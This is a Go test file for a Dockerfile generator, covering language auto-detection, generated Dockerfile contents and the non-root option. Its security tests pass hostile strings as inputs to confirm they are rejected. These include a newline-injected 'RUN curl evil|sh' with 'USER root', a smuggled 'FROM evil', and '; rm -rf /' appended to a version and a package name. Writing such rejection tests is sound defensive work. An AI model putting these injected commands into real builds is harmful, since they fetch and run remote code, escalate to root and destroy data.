package builder

import (
	"strings"
	"testing"
)

func TestAutoDetect(t *testing.T) {
	cases := []struct {
		files map[string]bool
		want  string
	}{
		{map[string]bool{"go.mod": true}, "go"},
		{map[string]bool{"package.json": true}, "node"},
		{map[string]bool{"requirements.txt": true}, "python"},
		{map[string]bool{"pyproject.toml": true}, "python"},
		{map[string]bool{"Gemfile": true}, "ruby"},
		{map[string]bool{"composer.json": true}, "php"},
		{map[string]bool{"index.html": true}, "static"},
		// go wins over node when both are present (most specific service first).
		{map[string]bool{"go.mod": true, "package.json": true}, "go"},
	}
	for _, c := range cases {
		b, err := Resolve(Spec{Language: "auto"}, c.files)
		if err != nil {
			t.Errorf("%v: %v", c.files, err)
			continue
		}
		if b.Name() != c.want {
			t.Errorf("%v: want %s got %s", c.files, c.want, b.Name())
		}
	}
}

func TestAutoDetectFailsWithGuidance(t *testing.T) {
	_, err := Resolve(Spec{Language: "auto"}, map[string]bool{"README": true})
	if err == nil || !strings.Contains(err.Error(), "generic") {
		t.Errorf("undetectable repo must error pointing at generic, got %v", err)
	}
}

func TestUnsupportedLanguage(t *testing.T) {
	if _, err := Resolve(Spec{Language: "cobol"}, nil); err == nil {
		t.Error("unsupported language must error")
	}
}

func TestNodeDockerfile(t *testing.T) {
	df, err := Generate(Spec{Language: "node", Version: "20", Install: "npm ci", Build: "npm run build", Start: []string{"node", "dist/main"}, Nonroot: true}, nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"FROM node:20-alpine AS build", "RUN npm ci", "RUN npm run build", "USER app", `CMD ["node", "dist/main"]`} {
		if !strings.Contains(df, want) {
			t.Errorf("node Dockerfile missing %q:\n%s", want, df)
		}
	}
}

func TestGoDockerfileDefaults(t *testing.T) {
	df, err := Generate(Spec{Language: "go", Nonroot: true}, nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"golang:1.23-alpine AS build", "CGO_ENABLED=0 go build", "FROM alpine:3", `CMD ["/app/app"]`, "USER app"} {
		if !strings.Contains(df, want) {
			t.Errorf("go Dockerfile missing %q:\n%s", want, df)
		}
	}
}

func TestGenericRequiresBase(t *testing.T) {
	if _, err := Generate(Spec{Language: "generic", Start: []string{"./s"}}, nil); err == nil {
		t.Error("generic without base must error")
	}
	df, err := Generate(Spec{Language: "generic", Base: "ubuntu:24.04", Install: "make deps", Start: []string{"./bin/server"}, Nonroot: true}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(df, "FROM ubuntu:24.04") || !strings.Contains(df, "RUN make deps") {
		t.Errorf("generic Dockerfile wrong:\n%s", df)
	}
}

// SECURITY: an operator command containing a newline must be rejected so it cannot
// inject extra Dockerfile directives (e.g. a second FROM, USER root) — the Phase 1
// carry-forward.
func TestRejectsNewlineInjection(t *testing.T) {
	inj := "npm ci\nUSER root\nRUN curl evil|sh"
	if _, err := Generate(Spec{Language: "node", Install: inj, Start: []string{"node", "x"}}, nil); err == nil {
		t.Error("a newline in build.install must be rejected (Dockerfile injection)")
	}
	if _, err := Generate(Spec{Language: "node", Build: "echo x\nFROM evil", Start: []string{"node", "x"}}, nil); err == nil {
		t.Error("a newline in build.build must be rejected")
	}
	// also via build env values
	if _, err := Generate(Spec{Language: "node", Env: map[string]string{"K": "v\nUSER root"}, Start: []string{"x"}}, nil); err == nil {
		t.Error("a newline in build.env value must be rejected")
	}
}

func TestRejectsBadVersionAndPackages(t *testing.T) {
	if _, err := Generate(Spec{Language: "node", Version: "20; rm -rf /", Start: []string{"x"}}, nil); err == nil {
		t.Error("a bad version must be rejected")
	}
	if _, err := Generate(Spec{Language: "node", Packages: []string{"git; rm -rf /"}, Start: []string{"x"}}, nil); err == nil {
		t.Error("a bad package name must be rejected")
	}
}

func TestNonrootOff(t *testing.T) {
	df, err := Generate(Spec{Language: "node", Start: []string{"node", "x"}, Nonroot: false}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(df, "USER app") {
		t.Errorf("nonroot=false must not add USER app:\n%s", df)
	}
}

func TestEnvValueNewlineFromDefinition(t *testing.T) {
	// Simulates a definition that passes schema.validateBuild but should fail at Generate
	if _, err := Generate(Spec{Language: "node", Env: map[string]string{"MYVAR": "value\nUSER root"}, Start: []string{"node", "x"}}, nil); err == nil {
		t.Error("a newline in build.env value must be rejected (not validated at definition parse time)")
	}
}
